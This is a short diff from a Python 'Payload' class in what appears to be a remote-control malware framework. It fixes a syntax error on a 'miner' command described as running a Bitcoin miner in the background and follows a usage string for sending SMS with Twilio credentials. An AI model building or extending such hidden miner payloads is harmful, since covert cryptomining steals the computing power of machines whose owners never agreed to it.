@@ -527,11 +527,11 @@ class Payload():
         else:
             return 'usage: <send/read> [args]\n  arguments:\n\tnumber: phone number with country code - no spaces (ex. 18001112222)\n\tmessage: text message to send surrounded by quotes (ex. "example text message")\n\tsid: twilio account SID\n\ttoken: twilio auth token'
 
-    @config(platforms=['linux2','darwin'], command=True, usage='miner <url> <user> <pass>'):
+    @config(platforms=['linux2','darwin'], command=True, usage='miner <url> <user> <pass>')
     def miner(self, args):
         """
         Run Bitcoin miner in the background
-        
+
         `Required`
         :param str url:         stratum mining server url
         :param str username:    username for mining server
